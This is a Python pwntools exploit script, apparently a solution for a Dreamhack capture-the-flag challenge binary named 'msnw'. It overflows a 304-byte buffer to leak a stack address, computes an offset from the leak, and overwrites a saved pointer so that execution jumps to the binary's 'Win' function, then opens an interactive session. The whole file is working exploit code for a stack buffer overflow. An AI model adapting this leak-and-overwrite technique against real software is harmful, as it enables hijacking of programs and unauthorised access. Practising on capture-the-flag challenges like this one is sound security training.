#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF("./msnw",checksec=False)

r = process(exe.path)
# r = remote("host3.dreamhack.games",23938)

# payload = b'A'*304

# input()

# r.sendafter(b': ',payload)
# r.recvuntil(b'A'*304)
# LEAK = u64(r.recv(6) + b'\00\00')
# log.info("stack leak: " + hex(LEAK))

payload = b'A'*304
input()
r.sendafter(b': ',payload)
r.recv(0xc)
r.recv(0x130)

LEAK = u64(r.recv(6) + b'\00\00')
# log.info(str(LEAK))
log.info("LEAK: "+ hex(LEAK))

Win = int(hex(LEAK),16) - 816 - 8
log.info("Address_to_win: " +hex(Win))
payload = p64(exe.sym['Win'])
payload = payload.ljust(304)
payload	+= p64(Win)

r.sendafter(b': ',payload)

r.interactive()